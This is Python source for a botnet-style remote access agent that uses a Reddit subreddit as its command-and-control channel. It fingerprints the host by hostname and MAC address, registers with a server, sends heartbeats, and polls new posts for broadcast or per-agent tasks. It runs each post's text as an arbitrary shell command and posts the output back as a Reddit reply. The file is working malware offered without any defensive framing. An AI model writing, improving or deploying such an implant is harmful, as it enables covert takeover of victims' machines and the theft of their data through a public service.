import praw, json, subprocess, time, uuid, socket, requests, uuid

# Load credentials
with open("config.json") as f:
    creds = json.load(f)

reddit = praw.Reddit(
    client_id=creds["client_id"],
    client_secret=creds["client_secret"],
    username=creds["username"],
    password=creds["password"],
    user_agent=creds["user_agent"]
)

SERVER_URL = "http://192.168.1.76:5000"
SUBREDDIT = "taskdropbox"
mac = hex(uuid.getnode())
AGENT_ID = f"{socket.gethostname()}-{mac}"
processed_posts = set()

def execute_command(command):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT
        )
        return result.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="ignore")

def beacon():
    subreddit = reddit.subreddit(SUBREDDIT)
    resp = requests.get(f"{SERVER_URL}/processed").json()

    for post in subreddit.new(limit=5):
        already_done = resp.get(post.id, [])

        if AGENT_ID in already_done:
            continue  # this agent already did it

        title = post.title.strip()

        # Broadcast case
        if title.upper() == "ALL":
            command = post.selftext.strip()
            output = execute_command(command)
            post.reply(f"{AGENT_ID}: {output}")
            requests.post(f"{SERVER_URL}/processed", json={"post_id": post.id, "agent_id": AGENT_ID})

        else:
            # Split by comma for single/multi targets
            targets = [t.strip() for t in title.split(",")]
            if AGENT_ID in targets:
                command = post.selftext.strip()
                output = execute_command(command)
                post.reply(f"{AGENT_ID}: {output}")
                requests.post(f"{SERVER_URL}/processed", json={"post_id": post.id, "agent_id": AGENT_ID})

                      
            
def register_agent():
    register = requests.post(f"{SERVER_URL}/register", json={"Agent Id": AGENT_ID})
    

def heartbeat():
    echo = requests.post(f"{SERVER_URL}/beacon", json={"Agent Id": AGENT_ID})
    
if __name__ == "__main__":
    register_agent()  # startup
    while True:
        heartbeat()  # update every loop
        beacon()
        time.sleep(30)    
     
    

    
